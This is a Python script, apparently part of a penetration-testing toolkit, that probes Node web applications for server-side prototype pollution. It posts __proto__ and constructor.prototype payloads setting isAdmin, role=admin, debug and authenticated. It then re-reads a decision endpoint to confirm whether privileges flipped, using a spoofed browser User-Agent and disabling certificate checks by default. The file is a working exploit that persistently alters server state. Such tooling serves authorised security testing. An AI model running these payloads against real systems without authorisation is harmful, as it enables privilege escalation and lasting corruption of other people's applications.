#!/usr/bin/env python
"""proto_pollute.py — server-side prototype-pollution (SSPP) detector (stdlib only).

Node apps that recursively merge client JSON (lodash.merge, defaults-deep, qs, object-assign of
nested input) can let an attacker set Object.prototype keys via __proto__ / constructor.prototype.
A downstream check that reads the polluted key as a fallback (isAdmin, a removed sanitizer,
rateLimit, debug) then behaves attacker-chosen. Invisible to signature WAFs.

Sends __proto__/constructor.prototype carriers with privilege/debug markers, then RE-READS a
decision endpoint and diffs vs a clean control — pollution that only surfaces on a LATER request
is the real bug (single-request tests miss it; pitfalls.md). stdlib only; LEAD until impact shown.

Usage: python proto_pollute.py --json-url <POST/PUT url> --read-url <GET decision url> \\
        [--body '{"name":"x"}'] [--markers isAdmin,role,debug] [--insecure]
"""
import sys, json, ssl, re, copy, argparse, urllib.request, urllib.error

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
POLLUTANTS = {
    "__proto__": {"isAdmin": True, "role": "admin", "admin": 1, "debug": True, "authenticated": True},
    "constructor": {"prototype": {"isAdmin": True, "role": "admin", "admin": 1, "debug": True}},
}

def _req(url, method, body_obj, verify):
    data = json.dumps(body_obj).encode() if body_obj is not None else None
    h = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h),
                                   timeout=15, context=(_CTX if not verify else None))
        return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)

def pollute(json_url, read_url, base_body, markers, verify):
    findings = []
    # control: send the clean body, read the decision endpoint
    _req(json_url, "POST", base_body or {}, verify)
    s_ctrl, body_ctrl = _req(read_url, "GET", None, verify) if read_url else (None, "")
    for vec, payload in POLLUTANTS.items():
        body = copy.deepcopy(base_body or {})
        if isinstance(body, dict):
            body[vec] = payload
        else:
            body = {vec: payload}
        s, _ = _req(json_url, "POST", body, verify)
        s_after, body_after = _req(read_url, "GET", None, verify) if read_url else (None, "")
        # diff: did any marker flip true/present in the post-pollution read but not the control?
        flips = []
        for m in markers:
            before = re.search(rf'"{m}"\s*:\s*(true|1|"admin")', (body_ctrl or ""), re.I)
            after = re.search(rf'"{m}"\s*:\s*(true|1|"admin")', (body_after or ""), re.I)
            if after and not before:
                flips.append(m)
        # also flag accepted-then-reflected (200 on the polluted POST is a merge-sink lead even without a flip)
        if flips:
            findings.append({"id": "prototype-pollution-impact", "severity": "high",
                             "detail": f"vector '{vec}' flipped marker(s) {flips} on the decision endpoint — confirmed SSPP impact (CWE-1321)",
                             "vector": vec, "flipped": flips})
        elif s in (200, 201):
            findings.append({"id": "prototype-pollution-sink-lead", "severity": "medium",
                             "detail": f"vector '{vec}' was ACCEPTED (HTTP {s}) by the JSON endpoint — a merge sink exists; impact needs a downstream read of a polluted key (LEAD until a marker flips)",
                             "vector": vec, "status": s})
    return {"target": json_url, "read_url": read_url, "ok": True, "findings": findings,
            "note": "SSPP. Pollution that surfaces only on a LATER request is the real bug — single-request tests miss it. LEAD until a marker flips (impact demonstrated)."}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Server-side prototype-pollution detector")
    ap.add_argument("--json-url", required=True); ap.add_argument("--read-url")
    ap.add_argument("--body", default="{}"); ap.add_argument("--markers", default="isAdmin,role,admin,debug,authenticated")
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()
    try:
        base = json.loads(a.body)
    except Exception:
        base = {}
    print(json.dumps(pollute(a.json_url, a.read_url, base, [m.strip() for m in a.markers.split(",")], not a.insecure), indent=2))
